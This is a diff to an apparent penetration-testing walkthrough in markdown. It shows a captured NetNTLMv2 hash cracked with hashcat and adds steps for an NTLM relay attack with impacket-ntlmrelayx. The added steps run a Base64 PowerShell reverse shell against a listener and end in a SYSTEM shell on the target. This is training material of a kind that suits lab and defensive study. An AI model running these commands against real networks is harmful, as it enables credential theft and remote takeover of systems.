@@ -1279,9 +1279,7 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 
 # Dictionary cache hit:
 # * Filename..: /usr/share/wordlists/rockyou.txt
-# * Passwords.: 14344386
-# * Bytes.....: 139921355
-# * Keyspace..: 14344386
+# ...
 
 # ADMINISTRATOR::WIN7BOX:<NTLM_SERVER_CHALLENGE>:<NTLMV2_RESPONSE>:<NTLMV2_BLOB>:P@ssword
 
@@ -1289,32 +1287,19 @@ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
 # Status...........: Cracked
 # Hash.Name........: NetNTLMv2
 # Hash.Target......: ADMINISTRATOR::WIN-487IMQOIA8E:997b18cc61099ba2:3cc...000000
-# Time.Started.....: Mon Apr 11 16:49:34 2022 (1 sec)
-# Time.Estimated...: Mon Apr 11 16:49:35 2022 (0 secs)
-# Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-# Guess.Queue......: 1/1 (100.00%)
-# Speed.#1.........:  1122.4 kH/s (1.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
-# Recovered........: 1/1 (100.00%) Digests
-# Progress.........: 75776/14344386 (0.53%)
-# Rejected.........: 0/75776 (0.00%)
-# Restore.Point....: 73728/14344386 (0.51%)
-# Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-# Candidates.#1....: compu -> kodiak1
-
-# Started: Mon Apr 11 16:49:34 2022
-# Stopped: Mon Apr 11 16:49:37 2022
+# ...
 ```
 
 The captured NTLMv2 hash was successfully cracked, revealing the password: **`P@ssword`**.
 If the hash cannot be cracked, it may still be leveraged through a relay attack. This can be achieved using tools such as `impacket-ntlmrelayx` or Responder’s `MultiRelay.py`.
 
-**Step 3: Perform an NTLM relay attack with impacket-ntlmrelayx:**
+**Step 3: Disable SMB in Responder:**
 
 ```bash
 sudo sed -i 's/^SMB = .*/SMB = Off/' /etc/responder/Responder.conf
 ```
 
-**Step 4: Verify changes**
+**Verify change:**
 
 ```bash
 cat /etc/responder/Responder.conf | grep 'SMB ='
@@ -1325,6 +1310,43 @@ cat /etc/responder/Responder.conf | grep 'SMB ='
 ```bash
 # SMB = Off
 ```
+
+**Step 4: Generate a PowerShell Reverse Shell**
+
+Use [revshells.com](https://www.revshells.com/) to create a **PowerShell #3 (Base64)** reverse shell payload.
+Set the local IP, port, and generate the encoded command.
+
+**Step 5: Start a Netcat Listener**
+
+```bash
+nc -lvnp <PORT>
+```
+
+**Expected Output:**
+
+```bash
+# listening on [any] 9001 ...
+```
+
+**Step 6: Execute the NTLM Relay Attack**
+
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <BASE64_STRING>'
+```
+
+**Expected Output:**
+
+```bash
+# listening on [any] 9001 ...
+# connect to [10.10.110.133] from (UNKNOWN) [<TARGET_IP>] 52471
+
+PS C:\Windows\system32> whoami;hostname
+
+# nt authority\system
+# WIN11BOX
+```
+
+
 
 </details>
 
